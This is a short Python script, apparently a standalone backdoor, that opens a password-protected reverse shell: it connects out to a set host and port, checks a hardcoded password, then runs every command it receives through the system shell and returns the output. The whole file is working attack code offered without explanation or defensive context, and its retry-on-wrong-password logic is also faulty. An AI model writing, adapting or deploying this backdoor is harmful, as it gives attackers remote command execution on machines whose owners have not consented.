#!/usr/bin/python3
# -*- coding: utf-8 -*-


import subprocess
import socket


host = "127.0.0.1"
port = 443
passwd = "s3cr3t"


def login_dec(func):

    def wrapper():
        global s
        s.send("Login: ".encode("utf-8"))
        pwd = s.recv(1024)

        if pwd.decode("utf-8").strip() != passwd:
            print(pwd)
            login_dec(func)
        else:
            s.send("Connected #> ".encode("utf-8"))
            func()
    return wrapper


@login_dec
def shell():
    while True:
        data = s.recv(1024)

        if data.decode("utf-8").strip() == ":kill*":
            break

        proc = subprocess.Popen(data.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)
        s.send("#> ".encode("utf-8"))


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
shell()
